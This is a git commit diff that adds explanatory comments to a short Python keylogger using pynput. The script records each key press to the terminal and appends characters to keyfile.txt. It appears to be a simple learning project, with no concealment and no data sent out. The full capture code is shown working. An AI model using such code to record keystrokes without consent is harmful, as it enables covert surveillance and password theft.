ab2427c72e7db0cf3fb5928686df89799f90ba2d
MattB Silva <127241122+mattzsync@users.noreply.github.com>
2025-09-05 08:38:56 -0400

    Update keylogger.py comments

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,21 @@
 from pynput import keyboard
 
+# Function called when a key is pressed
 def keyPressed(key):
+    # Display the key pressed in the terminal
     print(str(key))
+    # open the keyfile.txt with mode "append"
     with open("keyfile.txt", "a") as logKey:
         try:
+            # append the key char 
             char = key.char
             logKey.write(char)
         except:
             print("Error getting char")
 
 if __name__ == "__main__":
+    # creating a listener for every key pressed
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
+    # Keeps the program running
     input()
